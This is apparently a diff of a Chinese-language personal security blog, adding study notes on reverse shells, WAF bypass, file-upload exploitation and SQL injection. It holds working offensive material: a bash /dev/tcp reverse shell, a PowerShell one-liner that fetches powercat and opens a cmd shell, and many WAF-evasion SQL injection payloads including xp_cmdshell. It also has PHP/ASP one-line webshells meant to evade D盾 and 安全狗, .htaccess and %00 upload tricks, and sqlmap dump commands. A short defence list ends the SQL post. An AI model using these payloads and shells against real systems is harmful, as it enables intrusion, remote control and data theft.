+<p>受控端：–&gt;<code>bash -i &gt;&amp; /dev/tcp/IP地址/监听端口 0&gt;&amp;1</code></p>
+<p>主控端：–&gt; nc中  <code>nc -lnvp40000 开始监听</code></p>
+<blockquote>
+<p>控制windows：powershell反弹</p>
+</blockquote>
+<p>受控端–&gt;：<code>nc -lnvp  9999</code></p>
+<p>主控端–&gt;：<code>powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c 127.0.0.1 -p 9999 -e cmd</code></p>
+<blockquote>
+<p>相关的宝贵资料:</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.cnblogs.com/anruy/p/4989161.html">nginx反向代理</a>，能进行数据的转发</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">linux shell反弹</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/99793">windows下powershell反弹</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/01/16/shell-rebound/" data-id="ckgg5oe0q000qzov2hyev8df7" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shell%E5%8F%8D%E5%BC%B9%E3%80%81powershell%E5%8F%8D%E5%BC%B9/" rel="tag">shell反弹、powershell反弹</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-cross-waf" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/01/15/cross-waf/" class="article-date">
+  <time datetime="2019-01-15T14:02:00.000Z" itemprop="datePublished">2019-01-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/15/cross-waf/">cross_waf</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>三种waf</p>
+<p>代码waf<br>    云waf<br>    物理waf</p>
+<p>绕过waf的方式：</p>
+<p>1.大小写混合<br>2.替换关键字<code>selselectect 1,2,3,4</code><br>3.使用编码<code>%55</code><br>4.使用注释 <code>union/**/select 1,2,4,</code><br>5.特殊符号<br>6.等价函数    <code>@@user=user()</code><br>7.HTTP参数控制<br>8.缓冲区溢出fuzz<br>9.整合绕过</p>
+<p>-&gt;1.大小写绕过<br>    用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法绕过，这是最简单的绕过技术</p>
+<p>举例：<code>z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4 </code></p>
+<p>-&gt;2.替换关键字<br>    这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过</p>
+<p>-&gt;3.使用编码</p>
+<p>3.1.URL编码</p>
+<p>在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29</p>
+<p>普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：<code>page.php?id=1%252f%252a*/UNION%252f%252a /SELECT</code></p>
+<p>举例：<code>z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</code></p>
+<p>3.2.十六进制编码</p>
+<p>举例：<code>z.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…</code></p>
+<p>　　　<code>SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</code></p>
+<p>示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点</p>
+<p>3.3.Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了</p>
+<p>看一下常用的几个符号的一些Unicode编码：</p>
+<p>单引号:   <code>%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</code></p>
+<p>空格：<code>%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</code></p>
+<p>左括号：<code>%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</code></p>
+<p>右括号：<code>%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</code></p>
+<p>举例：<code>?id=10%D6‘%20AND%201=2%23</code></p>
+<p>　　　<code>SELECT &#39;Ä&#39;=&#39;A&#39;; #1</code><br>两个示例中，前者利用双字节绕过，比如对单引号转义操作变成&#39;，那么就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用</p>
+<p>第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过</p>
+<p>另外utf-7的绕过，还有utf-16、utf-32的绕过</p>
+<p>-&gt;4. 使用注释    <code>//, -- , /**/, #, --+,--  -, ;，--a</code></p>
+<p>常见的用于注释的符号有哪些：<code>//, -- , /**/, #, --+,--  -, ;，--a</code></p>
+<p>4.1.普通注释</p>
+<p>举例：<code>z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4　　</code>　</p>
+<p>　　<code>　&#39;union%a0select pass from users#</code></p>
+<p>/**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别;#、–+用于终结语句的查询</p>
+<p>4.2.内联注释</p>
+<p>相比普通注释，内联注释用的更多，它有一个特性/!**/只有MySQL能识别</p>
+<p>举例：<code>index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3</code></p>
+<p>　　　<code>?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…</code></p>
+<p>​            两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点后面讨论的特殊符号也能实现，当然前提是包括/、*在内的这些字符能正常使用</p>
+<p>-&gt;5.特殊符号    非字母数字的字符，包括``、~、!、@、%、()、[]、.、-、+ 、|、%00`等</p>
+<p>5.1.使用反引号`，例如select <code>version()</code>，可以用来过空格和正则，特殊情况下还可以将其做注释符用</p>
+<p>5.2.神奇的<code>&quot;-+.&quot;，select+id-1+1.from users;</code> “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤</p>
+<p>5.3.@符号，<code>select@^1.from users; </code>@用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量</p>
+<p>5.4.<code>Mysql function() as xxx</code>  也可不用as和空格　　<code>select-count(id)test from users;</code> //绕过空格限制</p>
+<p>5.5.关键字拆分：<code>‘se’+’lec’+’t’</code></p>
+<p>　　　　　　<code>%S%E%L%E%C%T 1</code></p>
+<p>　　　　　　<code>1.aspx?id=1;EXEC(‘ma’+&#39;ster..x’+&#39;p_cm’+&#39;dsh’+&#39;ell ”net user”’)</code></p>
+<p>5.6.!和()：<code>or --+2=- -!!!2</code></p>
+<p> 　　　 <code>id=1+(UnI)(oN)+(SeL)(EcT)</code>　//另 Access中,”[]”用于表和列,”()”用于数值也可以做分隔</p>
+<p>-&gt;6.等价函数    有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用</p>
+<p>6.1.函数或变量</p>
+<pre><code>hex()、bin() ==&gt; ascii()
+
+sleep() ==&gt;benchmark()
+
+concat_ws()==&gt;group_concat()
+
+mid()、substr() ==&gt; substring()
+
+@@user ==&gt; user()
+
+@@datadir ==&gt; datadir()</code></pre>
+<p>6.2.符号</p>
+<p>and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有=不能使用的情况，可以考虑尝试<code>&lt;、&gt;</code>，因为如果不小于又不大于，那边是等于了</p>
+<p>在看一下用得多的空格，可以使用如下符号表示其作用：<code>%20 %09 %0a %0b %0c %0d %a0 /**/</code></p>
+<p>6.3生僻字</p>
+<p>MySQL/PostgreSQL支持XML函数：<code>Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’);</code>　　　　　　　　　　</p>
+<p><code>?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))</code></p>
+<p><code>SELECT xmlelement(name img,xmlattributes(1as src,&#39;a\l\x65rt(1)&#39;as \117n\x65rror));</code>　//postgresql</p>
+<p><code>?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</code></p>
+<p>MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制</p>
+<p>-&gt;7.HTTP参数控制<br>    这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制<br>    7.1.HPP(HTTP Parameter Polution)</p>
+<p>举例：<code>/?id=1;select+1,2,3+from+users+where+id=1—</code></p>
+<p>​    <code>/?id=1;select+1&amp;id=2,3+from+users+where+id=1—</code></p>
+<p>　　<code>/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users</code></p>
+<p>HPP又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3。不同服务器处理的方式不同：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">asp.net&#x2F;IIS -&gt;par1&#x3D;val1,val2</span><br><span class="line"></span><br><span class="line">ASP&#x2F;IIS -&gt; 	par1&#x3D; val1,val2</span><br><span class="line"></span><br><span class="line">PHP&#x2F;Apache-&gt;parl&#x3D;val2</span><br><span class="line"></span><br><span class="line">JSP&#x2F;Tomcat-&gt;par1&#x3D;val1</span><br><span class="line"></span><br><span class="line">Pell&#x2F;Apache-&gt;par1&#x3D;val1</span><br><span class="line"></span><br><span class="line">DBMan	-&gt;par1&#x3D;vall~~val2</span><br></pre></td></tr></table></figure>
+
+<p>7.2.HPF(HTTP Parameter Fragment)<br>这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)<br>    举例：　</p>
+<p>　　<code>    /?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--</code></p>
+<p>　　<code>select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—</code></p>
+<p>看罢上面两个示例，发现和HPP最后一个示例很像，不同之处在于参数不一样，这里是在不同的参数之间进行分割，到了数据库执行查询时再合并语句。</p>
+<p>7.3.HPC(HTTP Parameter Contamination)</p>
+<p>这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染</p>
+<p>RFC2396定义了如下一些字符：</p>
+<p><code>Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * &#39; ()</code><br>    <code>Reserved : ; / ? : @ &amp; = + $ ,</code><br>    <code>Unwise : &#123; &#125; | \ ^ [ ] </code></p>
+<p>不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：</p>
+<p>-&gt;8.缓冲区溢出<br>        缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p>
+<p>举例：</p>
+<p><code>?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</code></p>
+<p>示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p>
+<p>-&gt;9. 整合绕过</p>
+<p>整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说是总体与局部和的关系，另一方面则是多种技术的使用创造了更多的可能性，除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。</p>
+<p>举例：<br>    <code>z.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…</code></p>
+<p><code>id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -</code></p>
+<p><code>?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--      </code>    </p>
+<p>绕过安全狗新思路：<code>select 1,2,3/*%00*//*!50001from*/user</code></p>
+<p>sqlmap —-tamper参数的使用</p>
+<p>依次尝试每个tamper脚本：<code>for t in </code>ls /usr/share/sqlmap/tamper/*.py``; do echo -e “e[41;1m tamper: $te[0m”; sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.1.100/sql.asp?id=1&quot;">http://192.168.1.100/sql.asp?id=1&quot;</a> –dbs –random-agent –smart –batch –tamper $t –threads 10;done;`</p>
+<p>普通tamper搭配方式:</p>
+<p><code>tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes</code></p>
+<p>数据库为MSSQL的搭配方式:</p>
+<p><code>tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes</code></p>
+<p>数据库为MySql的搭配方式:</p>
+<p><code>tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor</code></p>
+<p>​<br>​<br>​<br>​<br>​    webshell</p>
+<blockquote>
+<p>PHP一句话：</p>
+</blockquote>
+<p><code>php:&lt;?php eval($_POST[&quot;pass&quot;]);?&gt;</code></p>
+<p><code>assert（$_POST[&#39;pass&#39;]）</code></p>
+<blockquote>
+<p>ASP一句话：</p>
+</blockquote>
+<p><code>eval request（&quot;pass&quot;）</code></p>
+<p>大马：不需要菜刀，本身集成了很多工具，如404</p>
+<p>PHP木马变形：****需要了解</p>
+<pre><code>create_function(string $args,string $code)
+string $args
+string $code</code></pre>
+<p>​<br>安全工具：安全狗、D盾</p>
+<p>要求：写一句话过D盾和安全狗</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/01/15/cross-waf/" data-id="ckgg5oe0f0004zov2a2ki57wi" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%BF%87waf/" rel="tag">过waf</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-file-update" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/01/13/file-update/" class="article-date">
+  <time datetime="2019-01-13T13:38:12.000Z" itemprop="datePublished">2019-01-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/13/file-update/">&#39;file_update&#39;</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li>文件上传一：    漏洞原理及三个测试点</li>
+</ul>
+<p>一.问题：服务器中webshell怎么运行</p>
+<p>lamp环境要求：apache nginx iis tomcat</p>
+<p>1.路径要求   脚本必须在/var/www/html中</p>
+<p>2.后缀名要求    .php .asp</p>
+<p>二. 上传漏洞</p>
+<p>1.哪里会产生漏洞：相册、视频、附件、文件管理器</p>
+<p>2.php接收上传的方式：</p>
+<pre><code>$_FILES[&#39;file&#39;]            文件名
+$_FILES[&#39;temp_name&#39;]    临时目录
+$_FILES[&#39;type&#39;]            类型
+$_FILES[&#39;size&#39;]            大小</code></pre>
+<p>3.移动接收到的文件    </p>
+<p><code>move_uploaded_files($_FILES[&#39;file&#39;],&#39;uploads/a.jpg&#39;)</code></p>
+<p>4.上传成功后需要找到文件名和路径==》<br>问题：<br>    文件名处理：<br>    后缀名处理：<br>    不显示路径:先传正常的文件，找到文件，再上传木马 </p>
+<p>5.上传文件的处理方式：***重要</p>
+<p>*不处理<br>    *js验证  ==》关闭浏览器js/用burp工具改文件名<br>    *type类型验证：浏览器识别的类型            content-type修改<br>    *文件头检测</p>
+<blockquote>
+<p>测试文件上传漏洞的三个点：类型、内容、后缀名</p>
+</blockquote>
+<p>注意burp抓到包后显示的内容的对应关系：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&quot;file&quot; 对应--&gt; &lt;name&#x3D;&quot;file&quot;&gt;	</span><br><span class="line"></span><br><span class="line">filename&#x3D;&quot;123.jpg&quot;对应--&gt;上传的文件名</span><br><span class="line"></span><br><span class="line">content-Type对应--&gt;浏览器识别的文件类型</span><br><span class="line"></span><br><span class="line">下面的空白  对应--&gt;上传文件的内容</span><br></pre></td></tr></table></figure>
+
+<p>制作图片木马：cmd下  <code>copy 213.jpg/b + 123.php /a 1.php</code></p>
+<p>实验：i春秋网站文件上传实验</p>
+<ul>
+<li>文件上传二：    文件名黑白名单</li>
+</ul>
+<ul>
+<li>黑名单绕过方式：大小写 空格    [‘’]</li>
+<li>白名单绕过：截断</li>
+</ul>
+<p>  1.文件名截断：（php5.2漏洞）</p>
+<p>  ​    </p>
+<p>  1.1.–&gt;文件名后加点<code>.</code>、空格<code> </code>、点空格点<code>. .</code>、?.jpg、冒号 冒号空格、%00、_、::$DATA加很多…….</p>
+<pre><code>      例如：    404.php%00.jpg--&gt;会保存成404.php
+
+          404.php .jpg--&gt;会保存成404.php</code></pre>
+<p>  1.2.–&gt;用<code>SetHandler application/x-httpd-php</code>命令,保存成.htaccess文件上传，然后用浏览器访问看看成功没有；–&gt;或者用<code>AddHandler application/x-httpd-php .jpg</code>命令添加一条允许的后缀</p>
+<p>  2.目录截断    </p>
+<p>  ​        文件名改成404.jpg，再把上传的目录后的文件名改成404.php .jpg, 然后在hex中找到20改成00再上传—- &gt;会保存成404.php</p>
+<ul>
+<li>文件上传三.解析漏洞</li>
+</ul>
+<p>1.利用<code>.htaccess</code>突破上传</p>
+<p>2.版本解析漏洞(iis5、iis6、iis7.5、nginx)</p>
+<p>iis5、iis6中:</p>
+<p>apache解析漏洞（1.x、2.x）会从右往左依次解析后缀名 如404.asp.jpg会-&gt;404.asp    但是php可能还会再次校验后缀造成不解析<br>`目录为.asp结尾的会把里面的文件都解析成asp文件</p>
+<p>-&gt;解释：apache运行php时有两种运行模式：<br>    fast-cgi–&gt;以接口方式，后续还会校验后缀<br>    module–&gt;php作为apache一部分，后缀名不再解析</p>
+<p>-&gt;线上实验：FCK编辑器漏洞</p>
+<p>nginx和iis7.5解析漏洞<br>        1.aa.pdf/aa.txt会被运行<br>        2.%00截断比较少见</p>
+<p>例：<code>http://192.168.11.29/404.txt/aaasfa.php会把404.txt里面的php</code>的代码运行</p>
+<p>windows解析漏洞（详情见前面的黑白名单解析部分）<br>        test.asp(空格)–&gt;在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，这也是可以被利用的！ {<a href="http://link.zhihu.com/?target=http://lib.csdn.net/base/linux">Linux</a>主机中不行，Linux允许这类文件存在}<br>        test.asp(. .)–&gt;点空格点</p>
+<p>​    </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/01/13/file-update/" data-id="ckgg5oe0i0007zov2cnhybu1a" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sql-inject-advance" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/01/04/sql-inject-advance/" class="article-date">
+  <time datetime="2019-01-04T05:44:43.000Z" itemprop="datePublished">2019-01-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/04/sql-inject-advance/">sql_注入进阶</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>基于时间延时的盲注</p>
+</blockquote>
+<blockquote>
+<p>一. 基于时间延时的盲注</p>
+</blockquote>
+<p>​        <code>select sleep(5)；等待五秒，返回值是0***</code></p>
+<p>​        <code>select if(arg1,arg2,arg3);判断返回值的真假</code></p>
+<p>​        <code>select benchmark(50000,md5(&#39;abc&#39;)) </code>前面是执行次数，后面是执行的命令</p>
+<ul>
+<li>判断第一个字母的方法</li>
+</ul>
+<p>  ​    <code>ASCII(substr(version(),1,1)&gt;50)</code></p>
+<ul>
+<li><p>判断ASCII码对应的值：    </p>
+<p>​    <code>select chr(49);</code></p>
+</li>
+<li><p>例子：</p>
+<p>​    <code>1.select if(length(versioin())&gt;5,sleep(3),1);先判段长度</code></p>
+<p>​    <code>2.select if(ascii substr((version()),1,1))&gt;50,sleep(2),0);再判断每个字母是什么</code></p>
+</li>
+</ul>
+<p>（先测试普通的注入，都不行就开始测试时间延迟盲注）</p>
+<blockquote>
+<p>二. 应用：—-&gt;除了select语句以外，其他的sql语句都有危险性，千万小心！！！    </p>
+</blockquote>
+<ul>
+<li>select（搜索功能）的注入：</li>
+</ul>
+<p>​        <code>select * from books where name like &#39;zs&#39;;</code></p>
+<ul>
+<li><p>update语句注入：</p>
+<ul>
+<li>原句：<code>UPDATE Person SET FirstName = &#39;Fred&#39; WHERE LastName = &#39;Wilson&#39; </code></li>
+<li>构造的语句：<code>update users set pass = &#39;123&#39; where if(length(version())&gt;5,sleep(2),0)#</code></li>
+<li>注意：使用update时一定返回值为0，否则密码全被改掉了！！！</li>
+</ul>
+</li>
+<li><p>insert(插入语句)测注入：</p>
+<ul>
+<li><p>原句：<code>insert into users(id,name,password)value(1,&#39;we&#39;,&#39;123&#39;)</code></p>
+</li>
+<li><p>构造的：<code>1&#39;,1,1)#</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>delete语句：</p>
+<ul>
+<li><p>原句：<code>delete from user where id =5</code></p>
+<p>如果数据够多，可以采用布尔盲注（省时间但是会删除成功）</p>
+<p>如果保留数据，就采用延时盲注（可能会比较浪费时间但不会真删除）</p>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>三. 正确安全的测试注入步骤（不改数据库）：</p>
+</blockquote>
+<p>​    先–&gt;：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">123&#39; and sleep(1) #</span><br><span class="line">123&quot; and sleep(1) #</span><br><span class="line">123&#39;) and sleep(1) #</span><br><span class="line">123&quot;) and sleep(1) #</span><br></pre></td></tr></table></figure>
+
+<p>​    然后–&gt;：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">123&#39; and id &#x3D; 100 and sleep(3)#</span><br><span class="line">123&#39; and id &#x3D; 1 and sleep(3)#</span><br><span class="line">123&#39; and id &#x3D; 10 and sleep(3)#</span><br><span class="line">123&#39; and id &#x3D; 11 and sleep(3)#</span><br><span class="line">123&#39; and id &#x3D; 111 and sleep(3)#</span><br></pre></td></tr></table></figure>
+
+<p>最后–&gt;：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">123&#39; and id &#x3D; 1 and if(length(version())&gt;5,sleep(3),0) #</span><br><span class="line"></span><br><span class="line">update users set img &#x3D; &#39;uploads&#x2F;1546450026timg3.jpg&#39; where name &#39;qwerdf&#39;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>宽字节注入-GBK编码</p>
+<ul>
+<li><p>原理：</p>
+<p>GBK注入：DF 5c 2字节，利用%df’的方式就可以注入</p>
+<p>utf8 3字节    没有注入</p>
+</li>
+</ul>
+</li>
+<li><p>二次编码注入</p>
+</li>
+</ul>
+<p>​    使用比较少，这里就不总结了</p>
+<blockquote>
+<p>四. 自动扫描sql注入：sqlmap</p>
+</blockquote>
+<p>​    启动：<code>python sqlmap.py --url &#39;http://192.168.11.86/index.php?id=1&#39; 添加注入地址</code></p>
+<p>​    -v参数 1-6可以选择显示的详细程度，报告默认保存在家目录下</p>
+<p>​    常规步骤：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--dbs 列出所有的数据库</span><br><span class="line">-D	库 --tables列出所有的表		</span><br><span class="line">-T	表	--columns列出所有的字段		</span><br><span class="line">-C	字段 --dump获取字段内容	</span><br><span class="line">--dump列出详细信息</span><br></pre></td></tr></table></figure>
+
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>举例：<code>C:\tools\sqlmap-1.2.12&gt;python sqlmap.py --url http://192.168.11.86/index.php?id=1 -D mysql -T user --columns -C password --dump</code></p>
+<ul>
+<li>五.防御sql注入的方法：<ul>
+<li>1.addslashes(string)；可以把字符中的引号加上\进行转义，但是不能防御数字型注入即id=1 and 类型</li>
+<li>2.PDO进行绑定</li>
+<li>3.使用防御软件进行（如Web Application Firewall等）</li>
+</ul>
+</li>
 </ul>
 
-
-        </div>
-        <!-- Sidebar Container -->
-        <div class="
-                col-lg-3 col-lg-offset-0
-                col-md-3 col-md-offset-0
-                col-sm-12
-                col-xs-12
-                sidebar-container
-            ">
-
-            <!-- About Me -->
-            <section class="visible-md visible-lg" style="padding: 0 18px">
-                <div class="short-about">
-                    <!--侧边栏头像-->
-                    
-                    <h5><a href="/about/">pengpengp</a></h5>
-                    
-                    <hr>
-                    <!-- SNS Link 社交 -->
-                    <ul class="list-inline">
-                        
-                        
-                        
-
-                        
-
-                        
-
-                        
-
-                        
-                    </ul>
-                </div>
-            </section>
-
-            <!-- Featured Tags  标签 -->
-            
-
-            
-
-        </div>
+      
     </div>
-</div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/01/04/sql-inject-advance/" data-id="ckgg5oe0s000uzov2gzn00nck" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql-inject/" rel="tag">sql_inject</a></li></ul>
 
-<!-- Footer -->
-<!-- Footer -->
-<footer>
-    <div class="container">
-        <div class="row">
-            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
-                <br>
-                <ul class="list-inline text-center">
-                
-                
-                
+    </footer>
+  </div>
+  
+</article>
 
-                
 
-                
+  
+    <article id="post-sql-inject-Process" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/28/sql-inject-Process/" class="article-date">
+  <time datetime="2018-12-28T12:21:52.000Z" itemprop="datePublished">2018-12-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/28/sql-inject-Process/">&#39;sql_inject_Process&#39;</a>
+    </h1>
+  
 
-                
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>留言板安全问题</p>
+</blockquote>
+<p><code>用户名root &#39; or 1 = 1#</code><br>    <code>密码1</code><br>    –&gt;万能密码注入</p>
+<blockquote>
+<p>原理：</p>
+</blockquote>
+<p>​    SELECT * FROM users WHERE username=’$user’ AND passwd =’”.md5($pwd).被变成</p>
+<p>select * from root username = ‘root ‘ or 1=1 # ‘and passwd =’’</p>
+<p>#后面被注释了   1=1导致查询语句总为真 衡真的原理</p>
+<p>判断能否注入：<br>    用户能控制输入的内容<br>    web应用能把用户输入的内容带到数据库中</p>
+<blockquote>
+<p>测试是否存在注入</p>
+</blockquote>
+<p>​<br>分类：<br>    根据输入内容：    字符型注入、数字型注入<br>    根据上面两种类型可以加括号和字符能使用双引号和单引号，分为：以下几种</p>
+<p>​    1.select * from users where id=1 纯数字型<br>        2.select * from users where id=’1’只加单引号<br>        3.select * from users where id=”1” 只加双引号<br>        4.select * from users where (id=1)数字加括号<br>        5.select * from users where (id=’1’)单引号加括号<br>        6.select * from users where (id=”1”)双引号加括号</p>
